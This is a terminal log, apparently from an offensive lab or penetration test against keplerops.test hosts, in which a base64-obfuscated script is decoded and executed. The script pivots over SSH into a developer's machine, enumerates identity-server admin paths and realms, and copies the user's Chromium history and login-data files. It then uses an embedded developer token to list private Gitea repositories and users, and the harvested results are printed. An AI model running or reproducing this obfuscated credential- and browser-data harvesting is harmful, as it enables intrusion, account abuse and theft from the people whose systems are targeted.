@@ -1,0 +1,78 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r19.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKZWNobyAiPT09IElEIFJFRElSRUNUUyA9PT0iCmZvciBwIGluIC8gL2FkbWluLyAvYWRtaW4gL3JlYWxtczsgZG8gZWNobyAiLS0gJHAiOyBjdXJsIC1zU2sgLW0gNyAtbyAvZGV2L251bGwgLUQgLSAiaHR0cHM6Ly9pZGVudGl0eS5rZXBsZXJvcHMudGVzdCRwIiB8IGhlYWQgLTEyOyBkb25lCmVjaG8gIj09PSBSRUFMTSBHVUVTU0VTID09PSIKZm9yIHIgaW4gbWFzdGVyIGtlcGxlcm9wcyBrZXBsZXJvcHMtdGVzdCBrZXBsZXJvcHMudGVzdCBLRVBMRVJPUFMgS0VQTEVST1BTLlRFU1QgZmllbGRrZXN0IGZpZWxkbGluayBmaWVsZGxpbmstd29ya3NwYWNlIHN1cHBvcnQgd29ya2xvYWRzIGFyd2Mgay1kZXYgZGVmYXVsdDsgZG8KIGNvZGU9JChjdXJsIC1zU2sgLW0gNiAtbyAvdG1wL28gLXcgJyV7aHR0cF9jb2RlfScgImh0dHBzOi8vaWRlbnRpdHkua2VwbGVyb3BzLnRlc3QvcmVhbG1zLyRyIik7IGVjaG8gIi0tICRyIC0+ICRjb2RlIDo6ICQoaGVhZCAtYyAxMjAgL3RtcC9vKSIKZG9uZQplY2hvICI9PT0gQ0hST01JVU0gSElTVE9SWSA9PT0iCnB5dGhvbjMgLSA8PCdQWScKaW1wb3J0IHNxbGl0ZTMsc2h1dGlsCnA9Jy9ob21lL3Jvd2FuLy5jb25maWcvY2hyb21pdW0vRGVmYXVsdC9IaXN0b3J5Jwp0cnk6CiAgICBzaHV0aWwuY29weShwLCcvdG1wL2guZGInKQogICAgYz1zcWxpdGUzLmNvbm5lY3QoJy90bXAvaC5kYicpCiAgICBmb3IgdSx0IGluIGMuZXhlY3V0ZSgnc2VsZWN0IHVybCx0aXRsZSBmcm9tIHVybHMgb3JkZXIgYnkgbGFzdF92aXNpdF90aW1lIGRlc2MgbGltaXQgNjAnKToKICAgICAgICBwcmludCh0LCd8Jyx1KQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBwcmludCgnRVJSJyxlKQpQWQplY2hvICI9PT0gQ0hST01JVU0gUFJFRlMvQk9PS01BUktTL0xPR0lOID09PSIKcHl0aG9uMyAtIDw8J1BZJwppbXBvcnQganNvbixnbG9iLHJlCmZvciBmIGluIFsnL2hvbWUvcm93YW4vLmNvbmZpZy9jaHJvbWl1bS9EZWZhdWx0L1ByZWZlcmVuY2VzJywnL2hvbWUvcm93YW4vLmNvbmZpZy9jaHJvbWl1bS9EZWZhdWx0L0Jvb2ttYXJrcycsJy9ob21lL3Jvd2FuLy5jb25maWcvY2hyb21pdW0vRGVmYXVsdC9Mb2dpbiBEYXRhJ106CiAgICB0cnk6CiAgICAgICAgZD1vcGVuKGYsJ3JiJykucmVhZCgpCiAgICAgICAgcHJpbnQoJyMjJyxmLGxlbihkKSkKICAgICAgICBmb3IgbSBpbiBzZXQocmUuZmluZGFsbChyYidodHRwcz86Ly9bQS1aYS16MC05Ll86Lz89JiV+Ky1dezQsMTIwfScsZCkpOgogICAgICAgICAgICBwcmludCgnICAnLG0uZGVjb2RlKCkpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6IHByaW50KCdFUlInLGYsZSkKUFkKZWNobyAiPT09IEdJVEVBIFJFUE8gTkFNRVMgPT09IgpBPSJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIgpjdXJsIC1zU2sgLW0gMTAgLXUgIiRBIiAiaHR0cHM6Ly9zb3VyY2Uua2VwbGVyb3BzLnRlc3QvYXBpL3YxL3JlcG9zL3NlYXJjaD9saW1pdD01MCIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb247IGQ9anNvbi5sb2FkKHN5cy5zdGRpbik7IHByaW50KFtyWyJmdWxsX25hbWUiXSBmb3IgciBpbiAoZC5nZXQoImRhdGEiKSBvciBkKSBdKScKY3VybCAtc1NrIC1tIDEwIC11ICIkQSIgImh0dHBzOi8vc291cmNlLmtlcGxlcm9wcy50ZXN0L2FwaS92MS9vcmdzL2ZpZWxka2VzdC9yZXBvcz9saW1pdD01MCIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb247IGQ9anNvbi5sb2FkKHN5cy5zdGRpbik7IHByaW50KFtyWyJmdWxsX25hbWUiXSBmb3IgciBpbiBkXSknCmVjaG8gIj09PSBHSVRFQSBVU0VSUyA9PT0iCmN1cmwgLXNTayAtbSAxMCAtdSAiJEEiICJodHRwczovL3NvdXJjZS5rZXBsZXJvcHMudGVzdC9hcGkvdjEvdXNlcnMvc2VhcmNoP2xpbWl0PTMwIiB8IHB5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsanNvbjsgZD1qc29uLmxvYWQoc3lzLnN0ZGluKTsgcHJpbnQoW3JbImxvZ2luIl0gZm9yIHIgaW4gKGQuZ2V0KCJkYXRhIikgb3IgZCldKScKUlNICmVjaG8gRE9ORV9LMTRfUjE5Cg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r19.sh; bash /tmp/k14_r19.sh; echo DONEMARK_1795201438379$((6*7))
+=== ID REDIRECTS ===
+-- /
+HTTP/1.1 302 Found
+Server: nginx
+Date: Fri, 20 Nov 2026 19:04:10 GMT
+Content-Length: 0
+Connection: keep-alive
+Location: https://identity.keplerops.test/admin/
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+
+-- /admin/
+HTTP/1.1 302 Found
+Server: nginx
+Date: Fri, 20 Nov 2026 19:04:10 GMT
+Content-Length: 0
+Connection: keep-alive
+Location: https://identity.keplerops.test/admin/master/console/
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+
+-- /admin
+HTTP/1.1 302 Found
+Server: nginx
+Date: Fri, 20 Nov 2026 19:04:10 GMT
+Content-Length: 0
+Connection: keep-alive
+Location: https://identity.keplerops.test/admin/master/console/
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+
+-- /realms
+HTTP/1.1 404 Not Found
+Server: nginx
+Date: Fri, 20 Nov 2026 19:04:10 GMT
+Content-Type: application/json
+Content-Length: 58
+Connection: keep-alive
+
+=== REALM GUESSES ===
+-- master -> 200 :: {"realm":"master","public_key":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr0dNq8MwR8d2pfjJchIQxGOl9xZYEEOi5hCL6+8em3gX
+-- keplerops -> 200 :: {"realm":"keplerops","public_key":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7VRjZ1KSQ3TxC3QTHO/C0tZehy09Ewap3j7v+IMWL
+-- keplerops-test -> 404 :: {"error":"Realm does not exist"}
+-- keplerops.test -> 404 :: {"error":"Realm does not exist"}
+-- KEPLEROPS -> 404 :: {"error":"Realm does not exist"}
+-- KEPLEROPS.TEST -> 404 :: {"error":"Realm does not exist"}
+-- fieldkest -> 404 :: {"error":"Realm does not exist"}
+-- fieldlink -> 404 :: {"error":"Realm does not exist"}
+-- fieldlink-workspace -> 404 :: {"error":"Realm does not exist"}
+-- support -> 404 :: {"error":"Realm does not exist"}
+-- workloads -> 404 :: {"error":"Realm does not exist"}
+-- arwc -> 404 :: {"error":"Realm does not exist"}
+-- k-dev -> 404 :: {"error":"Realm does not exist"}
+-- default -> 404 :: {"error":"Realm does not exist"}
+=== CHROMIUM HISTORY ===
+SUP-2841 · ARWC connector callback latency · FieldKest Support | https://support.keplerops.test/scp/tickets.php
+=== CHROMIUM PREFS/BOOKMARKS/LOGIN ===
+## /home/rowan/.config/chromium/Default/Preferences 202
+ERR /home/rowan/.config/chromium/Default/Bookmarks [Errno 2] No such file or directory: '/home/rowan/.config/chromium/Default/Bookmarks'
+ERR /home/rowan/.config/chromium/Default/Login Data [Errno 2] No such file or directory: '/home/rowan/.config/chromium/Default/Login Data'
+=== GITEA REPO NAMES ===
+['fieldkest/connector-archive', 'fieldkest/fieldlink-connector', 'fieldkest/policy-compiler', 'fieldkest/release-signer-history']
+['fieldkest/fieldlink-connector', 'fieldkest/policy-compiler', 'fieldkest/connector-archive', 'fieldkest/release-signer-history']
+=== GITEA USERS ===
+['fieldlink-bootstrap', 'rowan.ito']
+DONE_K14_R19
